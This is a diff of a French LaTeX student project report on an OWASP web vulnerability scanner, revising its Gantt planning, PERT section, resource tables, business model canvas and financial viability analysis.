+  \ganttbar[bar/.style={fill=owaspred!80}]{J -- Tests unitaires}{6}{7} \\
+  \ganttbar[bar/.style={fill=owaspblue!60}]{K -- Tests DVWA/VMs}{6}{7} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{L -- Analyse r\'esultats}{7}{8} \\
+  \ganttbar[bar/.style={fill=owaspblue!60}]{M -- R\'edaction rapport}{7}{8} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{N -- Finalisation}{8}{9} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{O -- Soutenance}{9}{10} \\
   % ── Jalons
   \ganttmilestone{Fin conception}{3} \\
   \ganttmilestone{Livraison finale}{10}
@@ -1263,102 +1706,25 @@ un retard sur la date de fin du projet (18/05/2026).
 {\small \textcolor{owaspred}{\rule{1cm}{4pt}} Chemin critique \quad
 \textcolor{owaspblue!60}{\rule{1cm}{4pt}} Tâches non critiques}
 \end{center}
-\captionof{figure}{Diagramme de Gantt — Planification du projet (14/03 au 18/05/2026)}
+\captionof{figure}{Diagramme de Gantt --- Planification du projet (14/03 au 18/05/2026)}
 
-% ────────────────────────────────────────────────────────────
-\section{Réseau PERT et chemin critique}
-% ────────────────────────────────────────────────────────────
+\vspace{0.5cm}
 
-Le diagramme PERT (Program Evaluation and Review Technique) modélise les dépendances entre
-tâches. Le \textbf{chemin critique} est la séquence de tâches dont la durée totale détermine
-la durée minimale du projet — aucun retard n'est possible sur ces tâches.
-
-\begin{table}[h!]
+\begin{landscape}
+\begin{figure}[p]
 \centering
-\caption{Analyse PERT — Durées, dépendances et marges}
-\begin{tabular}{p{0.7cm}p{4cm}p{1.5cm}p{1.3cm}p{1.4cm}p{1.4cm}p{1.4cm}p{1.2cm}}
-\toprule
-\hdr{Réf.} & \hdr{Tâche} & \hdr{Préd.} & \hdr{Durée (j)} & \hdr{Déb. tôt} & \hdr{Fin tôt} & \hdr{Déb. tard} & \hdr{Marge} \\
-\midrule
-\rowcritred A & Étude besoins            & —     & 5  & 0  & 5  & 0  & \textbf{0} \\
-\rowcritred B & Cahier des charges       & A     & 4  & 5  & 9  & 5  & \textbf{0} \\
-\rowcritred C & Conception archi.        & B     & 4  & 9  & 13 & 9  & \textbf{0} \\
-\rowB         D & Environnement VMs      & B     & 3  & 9  & 12 & 10 & 1 \\
-\rowcritred E & Détecteurs SQLi, XSS     & C, D  & 6  & 13 & 19 & 13 & \textbf{0} \\
-\rowcritred F & Détecteurs SSRF, IDOR    & E     & 5  & 19 & 24 & 19 & \textbf{0} \\
-\rowB         G & Détecteurs XXE, Upload & E     & 5  & 19 & 24 & 20 & 1 \\
-\rowcritred H & CVSS + Rapport HTML      & F     & 4  & 24 & 28 & 24 & \textbf{0} \\
-\rowB         I & CLI + Orchestrateur    & G     & 3  & 24 & 27 & 25 & 1 \\
-\rowcritred J & Tests unitaires          & H, I  & 4  & 28 & 32 & 28 & \textbf{0} \\
-\rowB         K & Tests DVWA/VMs         & I     & 4  & 27 & 31 & 28 & 1 \\
-\rowcritred L & Analyse résultats        & J, K  & 4  & 32 & 36 & 32 & \textbf{0} \\
-\rowB         M & Rédaction rapport      & J     & 6  & 32 & 38 & 33 & 1 \\
-\rowcritred N & Finalisation             & L, M  & 3  & 38 & 41 & 38 & \textbf{0} \\
-\rowcritred O & Soutenance               & N     & 5  & 41 & 46 & 41 & \textbf{0} \\
-\bottomrule
-\end{tabular}
-\end{table}
+\includegraphics[width=\linewidth,height=0.85\textheight,keepaspectratio]{gantt_planning.jpeg}
+\caption{Diagramme de Gantt --- vue GanttProject avec dates de début et fin}
+\end{figure}
+\end{landscape}
 
-\begin{center}
-\begin{tikzpicture}[
-  node distance=1.2cm and 1.8cm,
-  every node/.style={font=\footnotesize},
-  crit/.style={circle, draw=owaspred, fill=critred,
-               minimum size=1cm, thick, font=\bfseries\footnotesize},
-  norm/.style={circle, draw=owaspblue!60, fill=lightblue,
-               minimum size=1cm, font=\bfseries\footnotesize},
-  critarr/.style={-{Stealth[length=5pt]}, owaspred, very thick},
-  normarr/.style={-{Stealth[length=5pt]}, owaspblue!60, thick, dashed},
-  lbl/.style={font=\tiny\bfseries, midway, above, inner sep=1pt},
-]
-  \node[crit] (A) at (0,0)    {A};
-  \node[crit] (B) at (2,0)    {B};
-  \node[crit] (C) at (4,1)    {C};
-  \node[norm] (D) at (4,-1)   {D};
-  \node[crit] (E) at (6.2,0)  {E};
-  \node[crit] (F) at (8.2,1)  {F};
-  \node[norm] (G) at (8.2,-1) {G};
-  \node[crit] (H) at (10.2,1) {H};
-  \node[norm] (I) at (10.2,-1){I};
-  \node[crit] (J) at (12.2,0) {J};
-  \node[norm] (K) at (11.2,-1.8) {K};
-  \node[crit] (L) at (14,0)   {L};
-  \node[norm] (M) at (14,-1.5){M};
-  \node[crit] (N) at (15.8,0) {N};
-  \node[crit] (O) at (17.6,0) {O};
-  % Chemin critique
-  \draw[critarr] (A) -- (B);
-  \draw[critarr] (B) -- (C);
-  \draw[critarr] (C) -- (E);
-  \draw[critarr] (E) -- (F);
-  \draw[critarr] (F) -- (H);
-  \draw[critarr] (H) -- (J);
-  \draw[critarr] (J) -- (L);
-  \draw[critarr] (L) -- (N);
-  \draw[critarr] (N) -- (O);
-  % Non critique
-  \draw[normarr] (B) -- (D);
-  \draw[normarr] (D) -- (E);
-  \draw[normarr] (E) -- (G);
-  \draw[normarr] (G) -- (I);
-  \draw[normarr] (I) -- (J);
-  \draw[normarr] (I) -- (K);
-  \draw[normarr] (K) -- (L);
-  \draw[normarr] (J) -- (M);
-  \draw[normarr] (M) -- (N);
-\end{tikzpicture}
-\end{center}
-\captionof{figure}{Réseau PERT — Les nœuds rouges forment le chemin critique}
-
-\vspace{0.3cm}
-\begin{infobox}[title={Chemin Critique — durée totale : 46 jours (10 semaines)}]
-\[
-\mathbf{A \to B \to C \to E \to F \to H \to J \to L \to N \to O}
-\]
-Les tâches D, G, I, K, M disposent d'une \textbf{marge d'un jour} chacune.
-Tout retard sur les tâches du chemin critique entraînerait un retard sur la
-date de soutenance (18/05/2026).
-\end{infobox}
+\begin{landscape}
+\begin{figure}[p]
+\centering
+\includegraphics[width=\linewidth,height=0.85\textheight,keepaspectratio]{gantt_ressources.jpeg}
+\caption{Affectation des ressources par tâche --- vue GanttProject}
+\end{figure}
+\end{landscape}
 
 % ────────────────────────────────────────────────────────────
 \section{Répartition des ressources}
@@ -1419,7 +1785,7 @@ Git / GitHub & Logiciel (gratuit) & Gestion de version du code \\
 R1 — Fatima & 100\% & 100\% & 60\% & 50\% & 100\% \\
 \rowA R2 — Salma & 100\% & 50\% & 100\% & 50\% & 100\% \\
 \midrule
-\rowcolor{lightblue}Total & 2 & 1,5 & 1,6 & 1 & 2 \\
+\rowcolor{gray!12}Total & 2 & 1,5 & 1,6 & 1 & 2 \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1443,7 +1809,7 @@ Connexion internet & Coût indirect & Inclus dans frais courants \\
 \rowA Temps de travail & Coût humain & $\approx$ 250 heures / étudiante \\
 Documentation \& impression & Coût direct & $\approx$ 150 MAD \\
 \midrule
-\rowcolor{lightblue}\textbf{Coût total direct} & & \textbf{150 MAD} \\
+\rowcolor{gray!12}\textbf{Coût total direct} & & \textbf{150 MAD} \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1510,11 +1876,11 @@ Développeurs indépendants & Freelances, startups & Scanner léger, gratuit, CL
 \resizebox{\textwidth}{!}{%
 \begin{tabular}{|p{3.2cm}|p{3.2cm}|p{3.5cm}|p{3.2cm}|p{3.2cm}|}
 \hline
-\cellcolor{owaspblue!15}\textbf{Partenaires clés}
-& \cellcolor{owaspblue!15}\textbf{Activités clés}
-& \cellcolor{owaspred!15}\textbf{Proposition de valeur}
-& \cellcolor{owaspblue!15}\textbf{Relation client}
-& \cellcolor{owaspblue!15}\textbf{Segments clients} \\
+\cellcolor{gray!12}\textbf{Partenaires clés}
+& \cellcolor{gray!12}\textbf{Activités clés}
+& \cellcolor{gray!12}\textbf{Proposition de valeur}
+& \cellcolor{gray!12}\textbf{Relation client}
+& \cellcolor{gray!12}\textbf{Segments clients} \\
 \hline
 • OWASP Foundation\newline
 • Hébergeur cloud (OVH/AWS)\newline
@@ -1526,7 +1892,7 @@ Développeurs indépendants & Freelances, startups & Scanner léger, gratuit, CL
 • Support utilisateurs\newline
 • Marketing digital
 &
-\cellcolor{owaspred!10}
+\cellcolor{gray!8}
 \textbf{Scanner OWASP automatique, léger, open source avec CVSS v3.1 et rapport HTML. Intégrable CI/CD.}
 &
 • Documentation en ligne\newline
@@ -1539,9 +1905,9 @@ Développeurs indépendants & Freelances, startups & Scanner léger, gratuit, CL
 • Équipes DevSecOps\newline
 • Académique \\
 \hline
-\cellcolor{owaspblue!15}\textbf{Ressources clés}
-& \multicolumn{2}{c|}{\cellcolor{owaspblue!15}\textbf{Canaux de distribution}}
-& \multicolumn{2}{c|}{\cellcolor{owaspblue!15}\textbf{Structure des coûts}} \\
+\cellcolor{gray!12}\textbf{Ressources clés}
+& \multicolumn{2}{c|}{\cellcolor{gray!12}\textbf{Canaux de distribution}}
+& \multicolumn{2}{c|}{\cellcolor{gray!12}\textbf{Structure des coûts}} \\
 \hline
 • Code source Python\newline
 • Base de signatures\newline
@@ -1560,7 +1926,7 @@ Développeurs indépendants & Freelances, startups & Scanner léger, gratuit, CL
 • \textbf{Total charges fixes : 3~000~MAD/mois}
 } \\
 \hline
-\multicolumn{5}{|c|}{\cellcolor{lightblue}
+\multicolumn{5}{|c|}{\cellcolor{gray!10}
 \textbf{Sources de revenus :}
 Abonnement SaaS (99~MAD/mois) \textbullet{}
 Audit sur mesure (500~MAD/session) \textbullet{}
@@ -1592,7 +1958,7 @@ Aménagement (espace de travail)              & 2~000 \\
 \rowA Frais de création (SARL / auto-entrepreneur)   & 3~000 \\
 Autres (communication, papeterie)            & 1~000 \\
 \midrule
-\rowcolor{lightblue}\textbf{Total investissement initial} & \textbf{29~000 MAD} \\
+\rowcolor{gray!12}\textbf{Total investissement initial} & \textbf{29~000 MAD} \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1624,7 +1990,7 @@ Nombre de clients (objectif 6 mois)          & 50 \\
 \hdr{Calcul} & \hdr{Résultat} \\
 \midrule
 CA = Prix $\times$ Quantité = 99 $\times$ 50  & 4~950 MAD/mois \\
-\rowcolor{lightblue}\textbf{CA mensuel total} & \textbf{4~950 MAD} \\
+\rowcolor{gray!12}\textbf{CA mensuel total} & \textbf{4~950 MAD} \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1643,7 +2009,7 @@ Hébergement cloud par client (VPS partagé)   & 5 \\
 Coût de bande passante / transfert données    & 0 \\
 \rowA Autres (frais de paiement en ligne)     & 0 \\
 \midrule
-\rowcolor{lightblue}\textbf{Total coût variable unitaire} & \textbf{8 MAD / client} \\
+\rowcolor{gray!12}\textbf{Total coût variable unitaire} & \textbf{8 MAD / client} \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1659,7 +2025,7 @@ Coût de bande passante / transfert données    & 0 \\
 \midrule
 Marge unitaire = 99 $-$ 8                      & 91 MAD \\
 \rowA Marge totale = 91 $\times$ 50             & 4~550 MAD \\
-\rowcolor{lightblue}\textbf{Taux de marge = (91 $\div$ 99) $\times$ 100}
+\rowcolor{gray!12}\textbf{Taux de marge = (91 $\div$ 99) $\times$ 100}
   & \textbf{91,9~\%} \\
 \bottomrule
 \end{tabular}
@@ -1680,7 +2046,7 @@ Marketing digital (réseaux sociaux, SEO)      & 500 \\
 \rowA Outils / logiciels (domaine, outils CI) & 300 \\
 Autres charges (comptabilité, divers)         & 200 \\
 \midrule
-\rowcolor{lightblue}\textbf{Total charges fixes} & \textbf{3~000 MAD/mois} \\
+\rowcolor{gray!12}\textbf{Total charges fixes} & \textbf{3~000 MAD/mois} \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1696,7 +2062,7 @@ Autres charges (comptabilité, divers)         & 200 \\
 \midrule
 Charges totales = CV total + CF = 400 + 3~000 & 3~400 MAD \\
 \rowA Résultat = CA $-$ Charges = 4~950 $-$ 3~400 & 1~550 MAD \\
-\rowcolor{lightblue}\textbf{Rentabilité = (1~550 $\div$ 4~950) $\times$ 100}
+\rowcolor{gray!12}\textbf{Rentabilité = (1~550 $\div$ 4~950) $\times$ 100}
   & \textbf{31,3~\%} \\
 \bottomrule
 \end{tabular}
@@ -1713,7 +2079,7 @@ Charges totales = CV total + CF = 400 + 3~000 & 3~400 MAD \\
 \midrule
 Marge unitaire = 91 MAD                                  & 91 MAD \\
 \rowA Seuil (unités) = 3~000 $\div$ 91                   & \textbf{33 clients} \\
-\rowcolor{lightblue}\textbf{Seuil (en CA) = 33 $\times$ 99}
+\rowcolor{gray!12}\textbf{Seuil (en CA) = 33 $\times$ 99}
   & \textbf{3~267 MAD/mois} \\
 \bottomrule
 \end{tabular}
@@ -1737,7 +2103,7 @@ Stock initial (service numérique — pas de stock) & 0 \\
 \rowA Créances clients (10 clients $\times$ 99)  & 990 \\
 Dettes fournisseurs (hébergement)                & 150 \\
 \midrule
-\rowcolor{lightblue}\textbf{BFR = 0 + 990 $-$ 150}  & \textbf{840 MAD} \\
+\rowcolor{gray!12}\textbf{BFR = 0 + 990 $-$ 150}  & \textbf{840 MAD} \\
 \bottomrule
 \end{tabular}
 \end{table}
@@ -1755,7 +2121,7 @@ Trésorerie initiale (apport personnel)        & 5~000 \\
 \rowA Entrées d'argent (CA encaissé)          & 4~950 \\
 Sorties d'argent (charges totales)            & 3~400 \\
 \midrule
-\rowcolor{lightblue}\textbf{Trésorerie finale = 5~000 + 4~950 $-$ 3~400}
+\rowcolor{gray!12}\textbf{Trésorerie finale = 5~000 + 4~950 $-$ 3~400}
   & \textbf{6~550 MAD} \\
 \bottomrule
 \end{tabular}
@@ -1802,42 +2168,77 @@ Sorties d'argent (charges totales)            & 3~400 \\
 % ── 10. Analyse & Décision ────────────────────────────────
 \subsection*{\textcolor{owaspblue}{\ding{192}~~Analyse \& Décision}}
 
+\bigskip
+\textbf{\large 1. Le projet est-il rentable ?}
+
+\medskip
+\fbox{\textbf{OUI}} — Le taux de rentabilité mensuelle est de \textbf{31,3~\%}. Avec un chiffre d'affaires de 4~950~MAD/mois et des charges totales de 3~400~MAD, le résultat net mensuel est de \textbf{1~550~MAD}. Le taux de marge unitaire atteint 91,9~\%, ce qui est caractéristique d'un service numérique sans stock physique.
+
+\bigskip
+\textbf{\large 2. Quel est le seuil de rentabilité ?}
+
+\medskip
+Le seuil de rentabilité est atteint avec \textbf{33 clients abonnés}, soit un CA de \textbf{3~267~MAD/mois}. Au-delà de ce seuil, chaque client supplémentaire génère 91~MAD de profit net. Ce seuil est réaliste car il ne représente que 66~\% de l'objectif de 50 clients.
+
+\bigskip
+\textbf{\large 3. Quel est le retour sur investissement ?}
+
+\medskip
+L'investissement initial est de \textbf{29~000~MAD}. Avec un résultat net mensuel de 1~550~MAD, le retour sur investissement est atteint en \textbf{19 mois} environ (29~000 $\div$ 1~550 $\approx$ 18,7 mois). Ce délai diminue avec la croissance du nombre de clients.
+
+\bigskip
+\textbf{\large 4. Comment se positionne le projet face à la concurrence ?}
+
+\medskip
+Notre scanner se différencie par :
+\begin{itemize}
+  \item \textbf{Open source} : contrairement à Burp Suite (payant) et Acunetix (licence coûteuse)
+  \item \textbf{Scoring CVSS v3.1 intégré} : seul outil Python à générer un rapport avec évaluation CVSS automatique
+  \item \textbf{Légèreté} : installation en une commande (pip install), pas d'interface lourde
+  \item \textbf{Intégration CI/CD} : usage en pipeline automatisé, contrairement à OWASP ZAP qui nécessite une configuration manuelle
+  \item \textbf{Prix accessible} : 99~MAD/mois vs. 4~000+ MAD/mois pour les solutions entreprise
+\end{itemize}
+
+\bigskip
+\textbf{\large 5. Quels sont les risques identifiés ?}
+
+\medskip
+\begin{itemize}
+  \item \textbf{Risque concurrentiel} : OWASP ZAP est gratuit et bien établi. Mitigation : positionnement sur la simplicité et le support francophone.
+  \item \textbf{Risque de notoriété} : marque inconnue au lancement. Mitigation : stratégie open source (GitHub stars, communauté) + présence LinkedIn/Dev.to.
+  \item \textbf{Risque technique} : nécessité de mise à jour régulière des signatures CVE. Mitigation : veille automatisée + communauté de contributeurs.
+  \item \textbf{Risque marché} : marché marocain de la cybersécurité en développement. Mitigation : cibler également le marché francophone (Tunisie, Sénégal, France).
+\end{itemize}
+
+\bigskip
+\textbf{\large 6. Quelle est la stratégie de lancement ?}
+
+\medskip
+\begin{enumerate}
+  \item \textbf{Phase 1 (Mois 1--2)} : lancement open source sur GitHub et PyPI, documentation, tutoriels. Objectif : visibilité et premiers utilisateurs gratuits.
+  \item \textbf{Phase 2 (Mois 3--4)} : lancement de l'offre SaaS Pro (99~MAD/mois) avec hébergement cloud, support email, et mises à jour prioritaires. Objectif : 20 clients payants.
+  \item \textbf{Phase 3 (Mois 5--6)} : partenariats avec des écoles d'ingénieurs et PME marocaines. Formations payantes (200~MAD/personne). Objectif : 50 clients payants.
+\end{enumerate}
+
+\bigskip
+\textbf{\large 7. Décision finale}
+
+\medskip
 \begin{table}[h!]
 \centering
 \begin{tabular}{p{5.5cm}p{6cm}}
 \toprule
 \hdr{Critère} & \hdr{Évaluation} \\
 \midrule
-Rentabilité mensuelle        & 31,3~\% $\rightarrow$ \textcolor{green!60!black}{\textbf{Bonne}} \\
-\rowA Seuil de rentabilité   & 33 clients $\rightarrow$ \textcolor{green!60!black}{\textbf{Atteignable}} \\
-Investissement initial       & 29~000 MAD $\rightarrow$ \textcolor{orange}{\textbf{Modéré}} \\
-\rowA Trésorerie prévisionnelle & Positive dès M1 $\rightarrow$ \textcolor{green!60!black}{\textbf{Solide}} \\
-Risque marché                & Concurrence ZAP/Burp $\rightarrow$ \textcolor{orange}{\textbf{Moyen}} \\
+Rentabilité mensuelle        & 31,3~\% --- Bonne \\
+\rowA Seuil de rentabilité   & 33 clients --- Atteignable \\
+Investissement initial       & 29~000 MAD --- Modéré \\
+\rowA Trésorerie prévisionnelle & Positive dès M1 --- Solide \\
+Risque marché                & Concurrence ZAP/Burp --- Moyen \\
+\rowA Retour sur investissement & 19 mois --- Acceptable \\
 \bottomrule
 \end{tabular}
 \end{table}
-
-\bigskip
-\textbf{\large \ding{51}~Le projet est-il rentable ?}\quad
-\fbox{\textbf{OUI}} \quad (taux de rentabilité : 31,3~\%)
-
-\bigskip
-\textbf{Points forts :}
-\begin{itemize}
-  \item Taux de marge très élevé (91,9~\%) — service numérique sans stock
-  \item Seuil de rentabilité bas (33 clients) — rapidement atteignable
-  \item Coûts fixes très faibles grâce au travail en remote
-  \item Différenciation : seul outil Python open source avec scoring CVSS intégré
-\end{itemize}
-
-\medskip
-\textbf{Points faibles :}
-\begin{itemize}
-  \item Concurrence d'outils gratuits (OWASP ZAP) sur le segment académique
-  \item Notoriété faible en phase de lancement
-  \item Dépendance à la mise à jour régulière des signatures de vulnérabilités
-  \item Marché marocain de la cybersécurité encore en développement
-\end{itemize}
 
 \bigskip
 \textbf{Décision :} \quad
